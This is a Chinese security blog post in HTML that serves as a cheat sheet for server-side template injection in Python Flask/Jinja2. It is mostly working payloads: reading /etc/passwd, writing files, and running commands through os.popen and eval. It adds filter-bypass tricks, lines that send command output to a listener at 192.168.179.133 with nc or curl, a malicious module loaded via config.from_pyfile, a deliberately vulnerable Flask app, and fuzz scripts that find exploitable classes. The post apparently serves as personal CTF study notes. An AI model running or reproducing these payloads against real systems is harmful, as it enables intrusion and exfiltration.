@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言最近需要加紧修炼，听取师傅建议，博文还是当作笔记来看待，自己能看懂即可。 如有问题欢迎指教 : )  QICQ：1609410364 前置知识   名称 介绍    __dict__ 这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性   __class__ 返回一个实例对应的类型   __base__ 返回一个类所继承的基类   __subclasses__() 返回该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探SSTI">
+<meta property="og:url" content="https://www.sketchplane.top/2019/10/23/%E5%88%9D%E6%8E%A2SSTI/index.html">
+<meta property="og:site_name" content="sketch_pl4ne">
+<meta property="og:description" content="前言最近需要加紧修炼，听取师傅建议，博文还是当作笔记来看待，自己能看懂即可。 如有问题欢迎指教 : )  QICQ：1609410364 前置知识   名称 介绍    __dict__ 这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性   __class__ 返回一个实例对应的类型   __base__ 返回一个类所继承的基类   __subclasses__() 返回该">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Z0NUje.png">
+<meta property="article:published_time" content="2019-10-23T15:48:44.000Z">
+<meta property="article:modified_time" content="2019-10-24T07:51:49.694Z">
+<meta property="article:author" content="sketch_pl4ne">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/07/06/Z0NUje.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.sketchplane.top/2019/10/23/初探SSTI/"/>
+
+
+
+
+
+  <title>初探SSTI | sketch_pl4ne</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?efbba552aa6e43dbec35569bd35c0ef6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sketch_pl4ne</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2019/10/23/%E5%88%9D%E6%8E%A2SSTI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sketch_pl4ne">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sketch_pl4ne">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">初探SSTI</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T23:48:44+08:00">
+                2019-10-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近需要加紧修炼，听取师傅建议，博文还是当作笔记来看待，自己能看懂即可。</p>
+<p>如有问题欢迎指教 : ) </p>
+<p><code>QICQ：1609410364</code></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__dict__</code></td>
+<td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td>
+</tr>
+<tr>
+<td><code>__class__</code></td>
+<td>返回一个实例对应的类型</td>
+</tr>
+<tr>
+<td><code>__base__</code></td>
+<td>返回一个类所继承的基类</td>
+</tr>
+<tr>
+<td><code>__subclasses__()</code></td>
+<td>返回该类的所有子类</td>
+</tr>
+<tr>
+<td><code>__mro__</code></td>
+<td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td>
+</tr>
+<tr>
+<td><code>__slots__</code></td>
+<td>限制类动态添加属性</td>
+</tr>
+<tr>
+<td><code>__getattribute__()</code></td>
+<td>获取属性或方法，对模块和类都有效</td>
+</tr>
+<tr>
+<td><code>__getitem__()</code></td>
+<td>以索引取值或者键取值</td>
+</tr>
+<tr>
+<td><code>__globals__</code></td>
+<td>返回函数所在模块命名空间中的所有变量</td>
+</tr>
+</tbody></table>
+<h2 id="SSTI-判断流程"><a href="#SSTI-判断流程" class="headerlink" title="SSTI 判断流程"></a>SSTI 判断流程</h2><p><img src="https://s2.ax1x.com/2019/07/06/Z0NUje.png" alt=""></p>
+<h2 id="payload-under-python2"><a href="#payload-under-python2" class="headerlink" title="payload under python2"></a>payload under python2</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>PS：由于python3已经移除了file类，所以是找不到file类的，可以自己写个脚本确认一下。</p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/home/adu1t/Desktop/test.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'sketch_pl4ne_wants_a_girlfriend'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>只是换个函数，就不多讲了。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>思路就是从对象回溯到<code>object</code>类，然后再向下找<code>os</code>类，直接fuzz获取存在<code>os</code>模块的类的索引即可。</p>
+<p>通用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># popen().read()回显命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对于没有回显的函数可以用无回显命令执行的思路</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system返回int型值，不回显命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami| nc 192.168.179.133 2333')"</span>)</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<p>思路差不多，不过是找<code>builtins</code>类，在py2与py3都存在，只是可利用的类的位置有差异。</p>
+<h2 id="payload-under-python3"><a href="#payload-under-python3" class="headerlink" title="payload under python3"></a>payload under python3</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p>通用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>PS：这里思路是寻找<code>builtins</code>类，通过内置方法走一个命令执行，由于py2与py3在这个类上区别并不大，所以这个方法的理论上是通用的。</p>
+<p>我们只需要在不同环境fuzz出子类中存在<code>builtins</code>这个模块的类的即可。</p>
+<h2 id="Bypass-tricks"><a href="#Bypass-tricks" class="headerlink" title="Bypass tricks"></a>Bypass tricks</h2><p>原理5分钟，Bypass两小时。</p>
+<h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc'</span>+<span class="string">'/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原语句</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br><span class="line"><span class="comment"># 编码后</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].	__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ZXZhbA=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">"X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2hvYW1pJykucmVhZCgp"</span>.decode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>同理也可以进行其他种类编码。</p>
+<h3 id="Bypass-中括号"><a href="#Bypass-中括号" class="headerlink" title="Bypass 中括号"></a>Bypass 中括号</h3><p>读文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通用 __builtins__</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">58</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.popen().read()</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>这里我们还可以进一步bypass掉单引号 ; )</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.os.popen(chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>os</code>被过滤了，那很自然想到用<code>values()</code>找到它</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>chr()</code>也被过滤了呢？我们可能会开始考虑从其他地方拿字符出来拼接：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.popen('ls').read()</span></span><br><span class="line">&#123;% set str=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.str</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.os.popen(str(().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">7</span>)).__getitem__(<span class="number">7</span>)%<span class="number">2</span>bstr(().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">7</span>)).__getitem__(<span class="number">9</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于GET传参是有长度限制的，另外一个个去找字符拼接命令太沙雕了，是不是到这就为止了呢？</p>
+<p>nono哒哟！<strong>或许我们可以寻找一个专门包含字符集的模块？</strong><code>string</code>模块显然符合我们的要求，那么问题就是能否在payload中导入这个模块了，这里由于女神找我聊天，挖个坑，相信成功的话就又是一个有趣的姿势了。</p>
+<p>事实上，我们完全可以取一个别名来绕过这一限制（没想到吧hhh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set sketch_pl4ne=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(sketch_pl4ne(<span class="number">108</span>)%<span class="number">2</span>bsketch_pl4ne(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bypass-下划线"><a href="#Bypass-下划线" class="headerlink" title="Bypass 下划线"></a>Bypass 下划线</h3><p>这里采用 <code>request.args.param</code>将参数外带，适用于只对指定参数进行检测的过滤规则。</p>
+<p><strong>PS：<code>request</code>基本可以bypass许多的限制，绝不仅仅局限于下划线。</strong></p>
+<p>读文件</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"><span class="string">''</span>[request.args<span class="class">.<span class="keyword">class</span>][<span class="title">request</span>.<span class="title">args</span>.<span class="title">mro</span>][-1][<span class="title">request</span>.<span class="title">args</span>.<span class="title">subclasses</span>]<span class="params">()</span>[40]<span class="params">(request.args.payload)</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class">&#125;&#125;</span></span><br><span class="line">&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;payload=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bypass-左双花括号"><a href="#Bypass-左双花括号" class="headerlink" title="Bypass 左双花括号"></a>Bypass 左双花括号</h3><p>使用到了无回显的命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://192.168.179.133:2333/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><h4 id="无-globals-命令执行"><a href="#无-globals-命令执行" class="headerlink" title="无__globals__命令执行"></a>无__globals__命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.popen(<span class="string">'ls'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="加载自定义模块"><a href="#加载自定义模块" class="headerlink" title="加载自定义模块"></a>加载自定义模块</h4><p>写入配置文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload1</span></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system%0aCMD = system'</span>) &#125;&#125;</span><br><span class="line"><span class="comment"># payload2</span></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output%0aRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>config.from_pyfile(&#39;file_name&#39;)</code>加载文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.from_pyfile(<span class="string">'/tmp/evil'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'CMD'</span>](<span class="string">'whoami | nc 192.168.179.133 2333'</span>) &#125;&#125;</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="控制语句Fuzz脚本"><a href="#控制语句Fuzz脚本" class="headerlink" title="控制语句Fuzz脚本"></a>控制语句Fuzz脚本</h4><p>用于快速锁定所需模块的位置（因为题目环境可能和本地有所差异，人工Fuzz费时费力）</p>
+<h2 id="Some-scripts"><a href="#Some-scripts" class="headerlink" title="Some scripts"></a>Some scripts</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    print(name)</span><br><span class="line"></span><br><span class="line">    blacklist = []</span><br><span class="line">    <span class="keyword">for</span> bad_string <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> bad_string <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Oh, such a shame, &#123;&#125; is not allowed ;)"</span>.format(bad_string)</span><br><span class="line"></span><br><span class="line">    template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;/h1&gt;'</span>.format(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fuzz-py2"><a href="#Fuzz-py2" class="headerlink" title="Fuzz_py2"></a>Fuzz_py2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># 寻找有os类的object子类</span></span><br><span class="line">search = <span class="string">'os'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Fuzz-all"><a href="#Fuzz-all" class="headerlink" title="Fuzz_all"></a>Fuzz_all</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># 切换运行python版本即可获取所需模块的索引</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'__builtins__'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
